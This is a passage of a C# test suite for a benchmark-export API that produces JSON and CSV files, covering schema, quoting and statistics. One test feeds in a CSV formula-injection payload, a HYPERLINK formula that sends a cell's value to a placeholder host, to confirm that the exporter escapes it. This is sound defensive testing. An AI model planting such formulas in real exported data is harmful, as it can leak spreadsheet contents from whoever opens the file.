namespace XE_Local_AI_Engine.Tests.Endpoints.Benchmarks.V1;

using System.Globalization;
using System.Net;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.DependencyInjection.Extensions;
using NSubstitute;
using XE_Local_AI_Engine.Client.Endpoints.Benchmarks.V1;
using XE_Local_AI_Engine.Client.Persistence.Entities;
using XE_Local_AI_Engine.Client.Persistence.Stores;
using XE_Local_AI_Engine.Client.Services.Benchmarks;
using XE_Local_AI_Engine.Providers.Abstractions.Contracts;
using XE_Local_AI_Engine.Tests.Testing;

/// <summary>
///     The per-project export in both representations. The JSON body reuses the run-detail shape verbatim, so these
///     tests assert it still carries what a detail read carries (transcript and decrypted verdict) rather than
///     re-describing the shape; the CSV tests pin the RFC 4180 quoting and the quant parse, which have no other home.
/// </summary>
public sealed class BenchmarkExportEndpointTests
{
    private const string Api = "/api/local/v1/benchmarks";
    private static readonly Guid ProjectId = Guid.Parse("00000000-0000-0000-0000-000000000001");
    private static readonly Guid RunId = Guid.Parse("00000000-0000-0000-0000-000000000002");
    private static readonly Guid AgentId = Guid.Parse("00000000-0000-0000-0000-000000000003");

    [Test]
    [Arguments("/projects/00000000-0000-0000-0000-000000000001/export")]
    [Arguments("/projects/00000000-0000-0000-0000-000000000001/export.csv")]
    public async Task Export_WithoutOperatorToken_ReturnsUnauthorized(string path)
    {
        await using var context = CreateContext();
        using var client = context.Factory.CreateClient();
        using var request = new HttpRequestMessage(HttpMethod.Get, Api + path);

        using var response = await client.SendAsync(request).ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Test]
    [Arguments("/export")]
    [Arguments("/export.csv")]
    public async Task Export_ForAnUnknownProject_ReturnsNotFound(string suffix)
    {
        await using var context = CreateContext();
        context.Store.GetProjectAsync(ProjectId, Arg.Any<CancellationToken>()).Returns((BenchmarkProjectRecord?)null);
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}{suffix}");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.NotFound, response.StatusCode);
        AssertEx.Equal("application/problem+json", response.Content.Headers.ContentType?.MediaType);
        using var document = JsonDocument.Parse(body);
        AssertEx.Equal(BenchmarkErrorCode.NotFound.ToString(), document.RootElement.GetProperty("code").GetString());
    }

    [Test]
    public async Task ExportJson_CarriesTheProjectTheCohortAndEveryRunAtFullDetail()
    {
        await using var context = CreateContext();
        var attemptId = Guid.NewGuid();
        ArrangeProject(context);
        ArrangeRuns(context, Run(output: "[{\"type\":\"text\",\"text\":\"the answer\"}]", judgeAttemptId: attemptId));
        ArrangeVerdict(context, attemptId);
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        using var document = JsonDocument.Parse(body);
        var root = document.RootElement;
        AssertEx.True(root.EnumerateObject()
                          .Select(static property => property.Name)
                          .SequenceEqual([
                              "schemaVersion", "exportedAtUtc", "project", "rankCohort", "runs", "repeatGroups", "llamaBench", "pairwiseFit",
                              "taskItems", "cells", "scorableItemCount"
                          ], StringComparer.Ordinal),
            "The export root must retain its versioned wire schema and property ordering.");
        AssertEx.Equal(BenchmarkExportProjection.SchemaVersion, root.GetProperty("schemaVersion").GetInt32());
        AssertEx.Equal(expected: 4, root.GetProperty("schemaVersion").GetInt32());
        AssertEx.Equal(expected: 0, root.GetProperty("taskItems").GetArrayLength());
        AssertEx.Equal(expected: 0, root.GetProperty("cells").GetArrayLength());
        AssertEx.Equal(expected: 0, root.GetProperty("scorableItemCount").GetInt32());
        AssertEx.True(root.GetProperty("exportedAtUtc").GetInt64() > 0, "The export must record when it was taken.");
        var project = root.GetProperty("project");
        AssertEx.Equal("Project", project.GetProperty("name").GetString());
        AssertEx.Equal("Answer exactly.", project.GetProperty("coreTask").GetString());
        AssertEx.Equal(expected: 4096, project.GetProperty("contextTokens").GetInt32());

        // The frozen agent identity is a per-run fact, so it is read back off the runs rather than re-resolved.
        AssertEx.Equal("Agent", project.GetProperty("agent").GetProperty("name").GetString());
        AssertEx.Equal(expected: 2, project.GetProperty("agent").GetProperty("version").GetInt64());
        AssertEx.Equal(expected: 3, root.GetProperty("rankCohort").GetProperty("cohortGeneration").GetInt32());
        AssertEx.Equal(expected: 1, root.GetProperty("rankCohort").GetProperty("rankedCount").GetInt32());

        var run = root.GetProperty("runs")[0];
        AssertEx.Equal(expected: 1, root.GetProperty("runs").GetArrayLength());

        // The transcript and the decrypted verdict are the whole point of the JSON export: the listing projection never
        // reads the encrypted payload columns, so an export built from the listing alone would ship neither.
        AssertEx.Equal("the answer", run.GetProperty("outputParts")[0].GetProperty("text").GetString());
        AssertEx.Equal("solid answer", run.GetProperty("judge").GetProperty("summary").GetString());
        AssertEx.Equal("correctness", run.GetProperty("judge").GetProperty("criteria")[0].GetProperty("id").GetString());

        // Rank is a project-wide value the single-run read does not compute, so it is re-attached from the listing.
        AssertEx.Equal(expected: 1, run.GetProperty("rank").GetInt32());
        AssertEx.False(body.Contains("runtimeSnapshot", StringComparison.OrdinalIgnoreCase));
        AssertEx.False(body.Contains("secret-runtime", StringComparison.Ordinal));
    }

    [Test]
    public async Task ExportJson_SchemaFourCarriesTaskItemsCellsAndSummaryCellQuality()
    {
        await using var context = CreateContext();
        var taskItemId = Guid.Parse("70000000-0000-0000-0000-000000000007");
        var summary = Run(BenchmarkPrimaryStatus.Succeeded) with
        {
            TaskItemId = taskItemId,
            TaskItemIndex = 0,
            CellKey = "cell:model:1",
            CellQuality = 84
        };
        var full = summary with
        {
            CellQuality = 17
        };
        ArrangeProject(context);
        ArrangeRuns(context, summary);
        context.Store.GetRunAsync(summary.Id, Arg.Any<CancellationToken>()).Returns(full);
        context.Store.ListTaskItemsAsync(ProjectId, Arg.Any<CancellationToken>())
               .Returns([
                   new BenchmarkTaskItemRecord(taskItemId,
                       ProjectId,
                       ParentItemId: null,
                       Index: 0,
                       BenchmarkTaskItemKinds.Prompt,
                       Revision: 1,
                       InputHash: "v1:item",
                       CountsTowardScore: true,
                       JsonSerializer.SerializeToUtf8Bytes("Score this answer."),
                       ReferenceAnswerJson: null,
                       VerifierConfigJson: null,
                       GeneratorConfigJson: null,
                       Version: 1,
                       CreatedAtUtc: 10,
                       UpdatedAtUtc: 20)
               ]);
        context.Store.ListCellsAsync(ProjectId, Arg.Any<CancellationToken>())
               .Returns(new BenchmarkCellPage([
                       new BenchmarkCellRecord("cell:model:1", "model", "v1:aggregate", null, null, null, 84, 1, null,
                           [new BenchmarkCellItemRecord(summary.Id, taskItemId, 0, 84, null, null)])
                   ],
                   new BenchmarkRankCohort(2, "cohort-key", 3, RankedCount: 1, TotalScored: 1),
                   ScorableItemCount: 1));
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        using var document = JsonDocument.Parse(await response.Content.ReadAsStringAsync().ConfigureAwait(false));

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        var root = document.RootElement;
        AssertEx.Equal(expected: 4, root.GetProperty("schemaVersion").GetInt32());
        AssertEx.Equal("Score this answer.", root.GetProperty("taskItems")[0].GetProperty("prompt").GetString());
        AssertEx.Equal("cell:model:1", root.GetProperty("cells")[0].GetProperty("cellKey").GetString());
        AssertEx.Equal(expected: 1, root.GetProperty("scorableItemCount").GetInt32());
        AssertEx.Equal(expected: 84, root.GetProperty("runs")[0].GetProperty("cellQuality").GetInt32(),
            "The export must reattach cell quality from the ranking summary rather than the full-run record.");
    }

    [Test]
    public async Task ExportJson_IsOfferedAsAnAttachmentNamedAfterTheProjectAndTheMinute()
    {
        await using var context = CreateContext();
        ArrangeProject(context);
        ArrangeRuns(context, Run());
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);

        const string prefix = "attachment; filename=\"benchmark-project-";
        const string suffix = ".json\"";
        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        AssertEx.Equal("application/json", response.Content.Headers.ContentType?.MediaType);
        var disposition = response.Content.Headers.TryGetValues("Content-Disposition", out var values)
            ? string.Concat(values)
            : string.Empty;
        AssertEx.True(disposition.StartsWith(prefix, StringComparison.Ordinal) && disposition.EndsWith(suffix, StringComparison.Ordinal),
            $"Expected a '{prefix}…{suffix}' attachment name, got '{disposition}'.");

        // The stamp is the export's own minute, so it cannot be asserted literally — only that it IS one.
        var stamp = disposition[prefix.Length..^suffix.Length];
        AssertEx.True(DateTime.TryParseExact(stamp, "yyyyMMdd-HHmm", CultureInfo.InvariantCulture, DateTimeStyles.None, out _),
            $"'{stamp}' is not a yyyyMMdd-HHmm stamp.");
    }

    [Test]
    public async Task ExportCsv_WritesTheHeaderAndOneQuotedRowPerRun()
    {
        await using var context = CreateContext();
        ArrangeProject(context);

        // A comma in the model name is the case RFC 4180 exists for, and the quant tag rides after the last colon.
        // The row also carries the throughput split and the repeat block, because a CSV that showed only the blended
        // figure is the exact thing an operator would have to leave the tool to compute.
        ArrangeRuns(context,
            Run(BenchmarkPrimaryStatus.Succeeded, modelName: "owner/My,Model-GGUF:Q4_K_M") with
            {
                TotalTokens = 512,
                TokensPerSecond = 41.5,
                DurationMs = 12_340,
                QualityScore = 73,
                QualityScoreSource = BenchmarkQualityScoreSources.Judge,
                Throughput = new BenchmarkRunThroughput(TtftMs: 180.25, PromptTokens: 123, PromptMs: 500,
                    GenerationTokens: 89, GenerationMs: 2000, CachedPromptTokens: 7, SegmentCount: 2),
                RepeatGroupId = Guid.Parse("50000000-0000-0000-0000-000000000005"),
                RepeatIndex = 2,
                IsWarmup = false,
                RepeatMode = BenchmarkRepeatMode.AnswerVariance,
                SamplingSeed = "3",
                SamplingTemperature = 0.7d
            });
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export.csv");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var bytes = await response.Content.ReadAsByteArrayAsync().ConfigureAwait(false);
        var body = Encoding.UTF8.GetString(bytes);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        AssertEx.Equal("text/csv", response.Content.Headers.ContentType?.MediaType);
        AssertEx.False(bytes.AsSpan().StartsWith(Encoding.UTF8.Preamble), "The CSV contract is UTF-8 without a byte-order mark.");
        AssertEx.True(body.EndsWith("\r\n", StringComparison.Ordinal), "Every CSV record, including the last, must end with CRLF.");
        AssertEx.False(body.Replace("\r\n", string.Empty, StringComparison.Ordinal).Contains('\n', StringComparison.Ordinal),
            "CSV must not contain bare LF record separators.");
        var lines = body.Split("\r\n", StringSplitOptions.RemoveEmptyEntries);
        AssertEx.Equal(expected: 2, lines.Length, "One header row and one run row.");
        // The three repeat-mode columns are APPENDED, never inserted: a consumer that reads this flat export by column
        // INDEX — which is most of them — would otherwise start reading a sampling seed as a token count.
        AssertEx.Equal("rank,modelGroupKey,model,quant,kvCacheType,flashAttention,backend,placement,contextTokens,status,stopReason,"
                       + "repeatGroupId,repeatIndex,isWarmup,totalTokens,tokensPerSecond,ttftMs,promptTokens,promptTokensPerSecond,"
                       + "generationTokens,generationTokensPerSecond,cachedPromptTokens,segmentCount,durationMs,qualityScore,qualityScoreSource,"
                       + "judgeScore,userScore,rankExclusionReason,launchIdentity,receiptHash,"
                       + "repeatMode,samplingSeed,samplingTemperature,"
                       + "fidelityStatus,perplexityMean,perplexityStdErr,perplexityChunks,perplexityContextTokens,perplexityCorpusId,"
                       + "kldState,kldMean,kldP99,topTokenAgreement,kldBaseFingerprint,kldBaseLogitsDigest,"
                       + "pairwiseScore,pairwiseCiLow,pairwiseCiHigh,pairwiseComparisons,pairwiseFitKey,"
                       + "taskItemId,taskItemIndex,cellKey,taskInputHash,taskItemSetHash,cellQuality",
            lines[0]);

        // pp is 123 tokens over 500 ms = 246, tg is 89 over 2000 ms = 44.5. The group key is the base model, so the
        // quant is dropped from it and kept in its own column.
        AssertEx.Equal("1,\"owner/My,Model-GGUF\",\"owner/My,Model-GGUF:Q4_K_M\",Q4_K_M,,,,,4096,succeeded,,"
                       + "50000000-0000-0000-0000-000000000005,2,false,"
                       + "512,41.5,180.25,123,246,89,44.5,7,2,12340,73,judge,,,,,,answerVariance,3,0.7"

                       // A run with no fidelity attempt, no pairwise fit and no task item still writes every cell,
                       // empty. A short row is what breaks an index-reading consumer, which is the whole reason these
                       // were appended.
                       + new string(',', count: 23),
            lines[1]);
    }

    [Test]
    public async Task ExportCsv_CarriesTheIdentityStampsAndEscapesTheTaskItemIndex()
    {
        await using var context = CreateContext();
        ArrangeProject(context);
        var itemId = Guid.Parse("70000000-0000-0000-0000-000000000007");
        ArrangeRuns(context,
            Run(BenchmarkPrimaryStatus.Succeeded) with
            {
                QualityScore = 80,
                QualityScoreSource = BenchmarkQualityScoreSources.User,
                TaskItemId = itemId,

                // Negative only because an index is numeric and a leading '-' is what a spreadsheet evaluates. The
                // column is written through the formula guard for that reason, not because a real index is negative.
                TaskItemIndex = -1,
                CellKey = "cell:80000000-0000-0000-0000-000000000008:1",
                TaskInputHash = "v1:item",
                TaskItemSetHash = "v1:set",
                CellQuality = 75
            });
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export.csv");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        var row = body.Split("\r\n", StringSplitOptions.RemoveEmptyEntries)[1];
        AssertEx.True(row.EndsWith("," + itemId.ToString("D") + ",\"'-1\",cell:80000000-0000-0000-0000-000000000008:1,v1:item,v1:set,75",
                StringComparison.Ordinal),
            "The four stamps and the cell mean close the row, and the index is escaped: " + row);
    }

    [Test]
    public async Task ExportCsv_CarriesFidelityAndThePairwiseInterval_AndWithholdsAStaleKldFigure()
    {
        // Two runs measured against DIFFERENT base-logit digests. Only the one matching the project's current
        // settings may show its KLD numbers; the other exports kldState=stale with those three cells empty. Its
        // digest is still written, because that is the evidence for the withholding.
        await using var context = CreateContext();
        var stale = Guid.Parse("60000000-0000-0000-0000-000000000006");
        context.Store.GetProjectAsync(ProjectId, Arg.Any<CancellationToken>())
               .Returns(Project() with
               {
                   FidelityEnabled = true,
                   FidelityKldEnabled = true,
                   FidelityKldBaseModelName = "base.gguf",
                   FidelityKldBaseFingerprint = BaseFingerprint
               });
        var expected = BenchmarkKldCacheKey.Create(BaseFingerprint, BenchmarkFidelityCorpus.Require().Sha256,
            BenchmarkFidelityPolicy.DefaultChunks).Digest;
        ArrangeRuns(context,
            Run(BenchmarkPrimaryStatus.Succeeded) with
            {
                Fidelity = Fidelity(expected)
            },
            Run(BenchmarkPrimaryStatus.Succeeded, runId: stale) with
            {
                Fidelity = Fidelity("v1:" + new string('9', 64))
            });
        context.Store.GetActivePairwiseFitAsync(ProjectId, Arg.Any<CancellationToken>())
               .Returns(Fit(RunId, stale));
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export.csv");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
        var lines = body.Split("\r\n", StringSplitOptions.RemoveEmptyEntries);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        AssertEx.Equal(expected: 3, lines.Length);
        AssertEx.Contains(lines[1], $"succeeded,6.7977,0.074,200,512,wikitext2,ok,0.012,0.31,0.94,{BaseFingerprint},{expected},");
        AssertEx.Contains(lines[1], "62,55,69,6,fit-key-1");

        // Same measurement, incomparable digest: the three KLD cells are EMPTY, PPL is untouched (its own corpus id
        // is its comparability), and the digest that no longer matches is still there to explain why.
        AssertEx.Contains(lines[2], "succeeded,6.7977,0.074,200,512,wikitext2,kld-stale,,,,");
        AssertEx.Contains(lines[2], "41,33,49,6,fit-key-1");
    }

    /// <summary>The options the store writes the blob with; a per-call instance is what CA1869 is about.</summary>
    private static readonly JsonSerializerOptions PairwiseScoreOptions = new(JsonSerializerDefaults.Web);

    private const string BaseFingerprint = "v1:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";

    private static BenchmarkRunFidelity Fidelity(string digest) =>
        new("succeeded", Guid.NewGuid(), 6.7977, 0.074, 200, 512, "wikitext2", 0.012, 0.31, 0.94, BaseFingerprint, digest, null);

    private static BenchmarkPairwiseFitRecord Fit(Guid first, Guid second) =>
        new(Guid.NewGuid(), ProjectId, Guid.NewGuid(), 3, null, "fit-key-1", "judge-key", 7,
            "[]",
            JsonSerializer.Serialize(new[]
            {
                new BenchmarkPairwiseScoreEntry(first, 62, 55, 69, 6, 1000, null),
                new BenchmarkPairwiseScoreEntry(second, 41, 33, 49, 6, 1000, null)
            }, PairwiseScoreOptions),
            42, 1000, 99);

    [Test]
    public async Task ExportCsv_ForAValueASpreadsheetWouldEvaluate_EscapesItAsText()
    {
        // `model`, `modelGroupKey` and `quant` come from an operator-installed model name (or an HF repo id), and
        // `stopReason` is provider text stored verbatim. Opened in Excel or LibreOffice with formula evaluation on, a
        // leading `=`/`+`/`-`/`@`/tab/CR turns a data cell into a formula. Zero-cost to close, so it is closed.
        await using var context = CreateContext();
        ArrangeProject(context);
        ArrangeRuns(context,
            Run(BenchmarkPrimaryStatus.Succeeded, modelName: "=HYPERLINK(\"http://x/\"&A1,\"ok\")") with
            {
                PrimaryStopReason = "@stop"
            });
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export.csv");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        var row = body.Split("\r\n", StringSplitOptions.RemoveEmptyEntries)[1];

        // Quoted with a leading apostrophe — the spreadsheet-standard text escape, which readers strip back off — with
        // the embedded quotes still doubled per RFC 4180.
        AssertEx.Contains(row, "\"'=HYPERLINK(\"\"http://x/\"\"&A1,\"\"ok\"\")\"");
        AssertEx.Contains(row, ",\"'@stop\",");
    }

    [Test]
    [Arguments("=formula")]
    [Arguments("+formula")]
    [Arguments("-formula")]
    [Arguments("@formula")]
    [Arguments("\tformula")]
    [Arguments("\rformula")]
    public void ExportCsv_FieldBeginningWithAFormulaSignificantCharacter_IsQuotedAsText(string value)
    {
        AssertEx.Equal($"\"'{value}\"", BenchmarkExportCsv.Field(value));
    }

    [Test]
    public async Task ExportCsv_IsOfferedAsAnAttachmentNamedAfterTheProjectAndTheMinute()
    {
        await using var context = CreateContext();
        ArrangeProject(context);
        ArrangeRuns(context, Run());
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export.csv");

        using var response = await client.SendAsync(request).ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        var disposition = response.Content.Headers.ContentDisposition;
        AssertEx.NotNull(disposition);
        AssertEx.Equal("attachment", disposition!.DispositionType);
        var fileName = disposition.FileNameStar ?? disposition.FileName?.Trim('"');
        AssertEx.NotNull(fileName);
        AssertEx.True(fileName!.StartsWith("benchmark-project-", StringComparison.Ordinal));
        AssertEx.True(fileName.EndsWith(".csv", StringComparison.Ordinal));
        var stamp = fileName["benchmark-project-".Length..^".csv".Length];
        AssertEx.True(DateTime.TryParseExact(stamp, "yyyyMMdd-HHmm", CultureInfo.InvariantCulture, DateTimeStyles.None, out _));
    }

    [Test]
    public async Task ExportCsv_UsesTheListingProjectionWithoutReadingFullRunsOrSnapshots()
    {
        await using var context = CreateContext();
        ArrangeProject(context);
        ArrangeRuns(context, Run());
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export.csv");

        using var response = await client.SendAsync(request).ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        AssertEx.Equal(expected: 0, context.Snapshots.Deserialized,
            "CSV contains only listing columns and must not deserialize a frozen runtime snapshot.");
        _ = context.Store.DidNotReceive().GetRunAsync(Arg.Any<Guid>(), Arg.Any<CancellationToken>());
    }

    [Test]
    public async Task ExportJson_PreservesStoreOrderAndWithholdsStaleKldNumbersAsNull()
    {
        await using var context = CreateContext();
        var secondRunId = Guid.Parse("60000000-0000-0000-0000-000000000006");
        context.Store.GetProjectAsync(ProjectId, Arg.Any<CancellationToken>())
               .Returns(Project() with
               {
                   FidelityEnabled = true,
                   FidelityKldEnabled = true,
                   FidelityKldBaseModelName = "base.gguf",
                   FidelityKldBaseFingerprint = BaseFingerprint
               });
        ArrangeEmptySuite(context);
        var currentDigest = BenchmarkKldCacheKey.Create(BaseFingerprint, BenchmarkFidelityCorpus.Require().Sha256,
            BenchmarkFidelityPolicy.DefaultChunks).Digest;
        ArrangeRuns(context,
            Run(BenchmarkPrimaryStatus.Succeeded, runId: secondRunId) with
            {
                Fidelity = Fidelity("v1:" + new string('9', 64))
            },
            Run(BenchmarkPrimaryStatus.Succeeded) with
            {
                Fidelity = Fidelity(currentDigest)
            });
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        using var document = JsonDocument.Parse(await response.Content.ReadAsStringAsync().ConfigureAwait(false));

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        var runs = document.RootElement.GetProperty("runs");
        AssertEx.Equal(secondRunId.ToString(), runs[0].GetProperty("id").GetString());
        AssertEx.Equal(RunId.ToString(), runs[1].GetProperty("id").GetString());
        var stale = runs[0].GetProperty("fidelity");
        AssertEx.Equal(BenchmarkFidelityKldStates.Stale, stale.GetProperty("kldState").GetString());
        AssertEx.Equal(JsonValueKind.Null, stale.GetProperty("kldMean").ValueKind);
        AssertEx.Equal(JsonValueKind.Null, stale.GetProperty("kldP99").ValueKind);
        AssertEx.Equal(JsonValueKind.Null, stale.GetProperty("topTokenAgreement").ValueKind);
        AssertEx.Equal(6.7977d, stale.GetProperty("perplexityMean").GetDouble());
        AssertEx.Equal(BenchmarkFidelityKldStates.Ok, runs[1].GetProperty("fidelity").GetProperty("kldState").GetString());
    }

    [Test]
    public async Task ExportJson_WithAJudgePolicyStoredUnderAnOlderPromptVersion_StillExports()
    {
        // Same read path as the project detail (BenchmarkJudgePolicyProjection). A version constant moving must not
        // take the export down with it — the export is how an operator rescues a project's numbers.
        await using var context = CreateContext();
        ArrangeProject(context);
        ArrangeRuns(context, Run());
        var policy = new BenchmarkJudgePolicyV1(new BenchmarkJudgePolicyModelV1("judge.gguf", "v1:" + new string('a', 64), ["aaa"]),
            4096,
            BenchmarkJudgePolicyVersions.PromptVersion - 1,
            BenchmarkJudgePolicyVersions.OutputSchemaVersion,
            BenchmarkJudgePolicySamplingV1.FromSnapshot(BenchmarkFrozenPolicies.DeterministicSampling()),
            BenchmarkJudgeRubricDefaults.Default(),
            ReferenceAnswer: null);
        context.Store.GetCurrentJudgePolicyRevisionAsync(ProjectId, Arg.Any<CancellationToken>())
               .Returns(new BenchmarkJudgePolicyRevisionRecord(Guid.NewGuid(), ProjectId, 2,
                   BenchmarkJudgeSerialization.SerializePolicy(policy), new string('h', 64), "cohort-key", 3, 10));
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        using var document = JsonDocument.Parse(body);
        var judge = document.RootElement.GetProperty("project").GetProperty("judge");
        AssertEx.Equal(BenchmarkJudgePolicyVersions.PromptVersion - 1, judge.GetProperty("promptVersion").GetInt32());
        AssertEx.True(judge.GetProperty("promptVersionOutdated").GetBoolean());
    }

    private static void ArrangeProject(Context context)
    {
        context.Store.GetProjectAsync(ProjectId, Arg.Any<CancellationToken>()).Returns(Project());
        ArrangeEmptySuite(context);
    }

    private static void ArrangeEmptySuite(Context context)
    {
        // The suite sections of schema 4. A project with no item rows is the pre-suite shape these tests describe, so
        // both come back empty rather than absent — the export still has to say what the ranking counted.
        context.Store.ListTaskItemsAsync(ProjectId, Arg.Any<CancellationToken>()).Returns([]);
        context.Store.ListCellsAsync(ProjectId, Arg.Any<CancellationToken>())
               .Returns(new BenchmarkCellPage([], new BenchmarkRankCohort(2, "cohort-key", 3, RankedCount: 1, TotalScored: 1), ScorableItemCount: 0));
    }

    private static void ArrangeRuns(Context context, params BenchmarkRunRecord[] runs)
    {
        context.Store.ListAllRunsAsync(ProjectId, Arg.Any<CancellationToken>())
               .Returns(new BenchmarkRunPage(runs.Select(static run => run with
                   {
                       Rank = 1
                   }).ToArray(),
                   runs.Length,
                   new BenchmarkRankCohort(2, "cohort-key", 3, RankedCount: 1, TotalScored: 1)));
        foreach (var run in runs)
        {
            context.Store.GetRunAsync(run.Id, Arg.Any<CancellationToken>()).Returns(run);
        }
    }

    private static void ArrangeVerdict(Context context, Guid attemptId)
    {
        var stored = BenchmarkJudgeSerialization.SerializeResult(new BenchmarkJudgeResultV2(BenchmarkJudgePolicyVersions.OutputSchemaVersion,
            [new BenchmarkJudgeCriterionScoreV2("correctness", 8, "clear and correct")],
            "solid answer",
            80,
            "v1:aggregate"));
        context.Store.GetJudgeAttemptAsync(attemptId, Arg.Any<CancellationToken>())
               .Returns(new BenchmarkJudgeAttemptRecord(attemptId, RunId, 1, Guid.NewGuid(), 1, null, null,
                   BenchmarkJudgeAttemptStatus.Succeeded, stored, 80, null, 0, null, null, 1));
    }

    private static BenchmarkProjectRecord Project() =>
        new(ProjectId, "Project", Encoding.UTF8.GetBytes("\"Answer exactly.\""), 4096, AgentId, JudgeEnabled: false,
            CurrentJudgePolicyRevisionId: null, IsFrozen: true, 4, 10, 20);

    [Test]
    public async Task ExportJson_SummarizesEachRepeatGroupAndTranslatesItIntoLlamaBenchFields()
    {
        await using var context = CreateContext();
        ArrangeProject(context);
        var groupId = Guid.Parse("60000000-0000-0000-0000-000000000006");

        // Two measured repeats plus the warm-up they exist to control for. pp is 100 tokens over 500 ms (200/s) and
        // 200 over 2000 ms (100/s); tg is 50 over 1000 ms (50/s) and 70 over 700 ms (100/s). The two repeats carry
        // DIFFERENT token counts on purpose — an answer-variance group answers at different lengths, which is the
        // whole thing it measures, so the llama-bench row's nPrompt/nGen must be the group mean rather than the
        // first run's reading.
        ArrangeRuns(context,
            Grouped(groupId, repeatIndex: 0, warmup: true, ttftMs: 999, promptTokens: 9999, promptMs: 10, generationTokens: 9999, generationMs: 10),
            Grouped(groupId, repeatIndex: 1, warmup: false, ttftMs: 100, promptTokens: 100, promptMs: 500, generationTokens: 50, generationMs: 1000),
            Grouped(groupId, repeatIndex: 2, warmup: false, ttftMs: 200, promptTokens: 200, promptMs: 2000, generationTokens: 70, generationMs: 700));
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        using var document = JsonDocument.Parse(body);
        var groups = document.RootElement.GetProperty("repeatGroups");
        AssertEx.Equal(expected: 1, groups.GetArrayLength(), "The three runs are one group, not three.");
        var group = groups[0];
        AssertEx.Equal(groupId.ToString(), group.GetProperty("repeatGroupId").GetString());
        AssertEx.Equal(expected: 2, group.GetProperty("runIds").GetArrayLength(), "The warm-up is excluded — absorbing the first launch is its job.");

        var ttft = group.GetProperty("ttftMs");
        AssertEx.Equal(expected: 2, ttft.GetProperty("sampleCount").GetInt32());
        AssertEx.Equal(expected: 150d, ttft.GetProperty("mean").GetDouble());
        AssertEx.Equal(expected: 50d, ttft.GetProperty("stdDev").GetDouble(), "Population standard deviation: these runs ARE the population.");
        AssertEx.Equal(expected: 2, ttft.GetProperty("samples").GetArrayLength(), "The raw readings ride along, so a reader can summarize differently.");

        AssertEx.Equal(expected: 150d, group.GetProperty("promptTokensPerSecond").GetProperty("mean").GetDouble());
        AssertEx.Equal(expected: 75d, group.GetProperty("generationTokensPerSecond").GetProperty("mean").GetDouble());

        // The warm-up's wild counts are excluded here too, not just from the rates.
        AssertEx.Equal(expected: 150d, group.GetProperty("meanPromptTokens").GetDouble());
        AssertEx.Equal(expected: 60d, group.GetProperty("meanGenerationTokens").GetDouble());

        // llama-bench's own shape: a prompt-processing row and a token-generation row, in its field names.
        var rows = document.RootElement.GetProperty("llamaBench");
        AssertEx.Equal(expected: 2, rows.GetArrayLength());
        AssertEx.Equal(expected: 150, rows[0].GetProperty("nPrompt").GetInt32(), "The group MEAN of 100 and 200, not the first run's 100.");
        AssertEx.Equal(expected: 0, rows[0].GetProperty("nGen").GetInt32());
        AssertEx.Equal(expected: 150d, rows[0].GetProperty("avgTs").GetDouble());
        AssertEx.Equal(expected: 50d, rows[0].GetProperty("stddevTs").GetDouble());
        AssertEx.Equal(expected: 0, rows[1].GetProperty("nPrompt").GetInt32());
        AssertEx.Equal(expected: 60, rows[1].GetProperty("nGen").GetInt32(), "The group MEAN of 50 and 70, not the first run's 50.");
        AssertEx.Equal(expected: 75d, rows[1].GetProperty("avgTs").GetDouble());
